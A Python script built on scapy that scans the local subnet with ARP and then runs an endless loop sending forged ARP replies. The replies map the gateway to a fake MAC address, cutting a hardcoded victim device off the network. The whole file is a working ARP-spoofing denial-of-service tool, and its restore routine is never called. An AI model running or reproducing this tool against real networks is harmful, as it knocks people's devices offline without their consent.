import socket
import scapy.all as scapy
from scapy.layers.l2 import arping, ARP

res = []
timeout = 10000


def get_ip_mac_list(ips):
    global timeout
    answers, uans = arping(ips, verbose=0)

    for answer in answers:
        if answer[1].psrc != "192.168.1.1":
            mac = answer[1].hwsrc
            ip = answer[1].psrc
            if (ip, mac) not in res:
                res.append((ip, mac))
                timeout = timeout - 1
    if not res:
        get_ip_mac_list(ips) and timeout > 0

    return res


def kill(victim_ip, victim_mac, gateway_ip):
    wrong_mac = '12:34:56:78:9A:BC'
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=wrong_mac, pdst=victim_ip, hwdst=victim_mac)
    scapy.send(packet, verbose=0)


def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
    packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
    scapy.send(packet, verbose=0)


def get_lan_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("google.com", 80))
    ip = s.getsockname()
    s.close()
    return ip[0]


# Driver code
my_ip = get_lan_ip_address()
ip_list = my_ip.split('.')
del ip_list[-1]
ip_list.append('0/24')
ip_range = '.'.join(ip_list)
del ip_list[-1]
ip_list.append('1')
gateway_ip = '.'.join(ip_list)

devices = get_ip_mac_list(ip_range)

if devices:
    print(devices)
else:
    print("No connected devices")
while True:
    kill("192.168.1.2", "50:3d:c6:3a:e9:2b", gateway_ip)
